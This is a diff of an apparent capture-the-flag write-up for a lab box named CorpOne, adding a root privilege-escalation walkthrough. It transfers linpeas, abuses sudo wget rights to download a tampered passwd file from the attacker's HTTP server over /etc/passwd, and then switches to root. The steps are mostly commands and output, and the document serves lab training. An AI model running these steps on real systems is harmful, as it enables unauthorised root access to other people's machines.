@@ -118,4 +118,60 @@ Now you can find root flag easily.
 ```
 ***
 ```
-Lets transfer linpeas for finding path to privilege escalation. It can be done via secure copy (SCP) or also using a python simple HTTP server. Lets try to use `scp` this time.
+Lets transfer linpeas for finding path to privilege escalation. It can be done via secure copy (SCP) or also using a python simple HTTP server. <br>
+Lets try to use `scp` this time as port 22 is open.<br>
+**Note*** Inside linux based OS temporary files stored under `/dev/shm` directory. Most of the time this directory is writable and it is advisable there is a requirement of transferring malicious files into the system then store those files inside this directory to avoid `Write Permission Denied` issue.
+```bash
+└─# scp -i jessie_id_rsa /root/Desktop/transfer/linpeas.sh jessie@10.10.235.91:/dev/shm
+linpeas.sh                                                                                                                                                100%  462KB 358.4KB/s   00:01    
+ 
+```
+Now navigate to `/dev/shm` directory in the ssh session that we have already taken of this machine and try to execute `linpeas.sh` to find escalatuion path.
+```bash
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+```
+Lets try [GTFObins](https://gtfobins.github.io/gtfobins/wget/#sudo) to find out escalation path using wget. As we have download permission using `wget` sudo privileges. We will try to download `passwd` file whose root password we will manage and we will replace the original `passwd` file in victim's system by our modified file.
+```python3
+└─# python3                                                                                                                                                                               1 ⨯
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import crypt
+>>> crypt.crypt("simplepass")
+'$6$Wa5vl9Sqloa8cOCW$nkI75.Pc6U0UlcVG/cmNrLxBELrVgXLcuqpCImJf2OzJ.Z/pId6RfOV7xqWDbAzoIle6.Ri8XJXWteLfo2sqC.'
+>>>
+```
+Let's copy paste this string in place of x inside passwd file which is currently on our local system.
+```bash
+┌──(root💀kali)-[~/Desktop/transfer]
+└─# ls     
+linpeas.sh  passwd  pentestmonkey.php
+                                                                 
+┌──(root💀kali)-[~/Desktop/transfer]
+└─# python -m SimpleHTTPServer 8080
+```
+On victim's system execute the following.
+```bash
+jessie@CorpOne:/dev/shm$ cp /etc/passwd ./passwd.bak
+jessie@CorpOne:/dev/shm$ ls
+linpeas.sh  passwd.bak  pulse-shm-1285657475  pulse-shm-1665596888  pulse-shm-2287659282  pulse-shm-2914594193  pulse-shm-465583087
+jessie@CorpOne:/dev/shm$ sudo wget http://10.9.155.203:8080/passwd -O /etc/passwd
+--2021-09-27 09:04:46--  http://10.9.155.203:8080/passwd
+Connecting to 10.9.155.203:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2397 (2,3K) [application/octet-stream]
+Saving to: ‘/etc/passwd’
+
+/etc/passwd                                     100%[=====================================================================================================>]   2,34K  --.-KB/s    in 0s      
+
+2021-09-27 09:04:46 (5,39 MB/s) - ‘/etc/passwd’ saved [2397/2397]
+```
+Now switch to root with password 'simplepass'.
+```bash
+jessie@CorpOne:/dev/shm$ su - root
+Password: 
+root@CorpOne:~# 
+```
+
